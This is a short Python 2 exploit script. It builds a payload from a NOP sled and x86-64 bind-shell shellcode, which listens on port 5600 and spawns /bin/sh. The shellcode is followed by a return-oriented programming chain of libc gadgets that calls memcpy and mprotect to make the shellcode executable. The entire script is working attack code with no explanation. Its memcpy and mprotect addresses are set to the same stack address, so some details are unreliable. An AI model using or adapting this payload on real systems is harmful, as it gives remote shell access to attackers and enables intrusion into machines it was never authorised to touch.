from struct import pack

l=lambda a:pack("Q",a)

shellcode= "\x90"*138 + "\x48\x31\xc0\x48\x31\xf6\x99\x6a\x29\x58\xff"
shellcode+= "\xc6\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66"
shellcode+= "\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x10"
shellcode+= "\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x6a\x32\x58"
shellcode+= "\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03"
shellcode+= "\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31"
shellcode+= "\xc0\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73" 
shellcode+= "\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05"
abc = "A"*8

#0x00007ffff7de5000
libc6 = 0x00007ffff7de5000

#0x00007ffff7fa1000
dst= l(0x00007ffff7fa1000)

#0x7fffffffe050
src= l(0x7fffffffe050)

ln= l(len(shellcode))

#pop_rdi 0x000000000002658e
pop_rdi = l(libc6+0x000000000002658e)

#pop_rsi 0x0000000000026aa9
pop_rsi = l(libc6+0x0000000000026aa9)

#pop_rdx 0x0000000000107425
pop_rdx = l(libc6+0x0000000000107425)

#0x7fffffffe050
memcpy = l(0x7fffffffe050)

ps = l(0x1000)
prot = l(0x7)

#0x7fffffffe050
mprotect = l(0x7fffffffe050)

payload = shellcode + abc + pop_rdi + dst + pop_rsi +src + pop_rdx + ln + memcpy + pop_rdi + dst + pop_rsi + ps + pop_rdx + prot + mprotect + dst

print payload
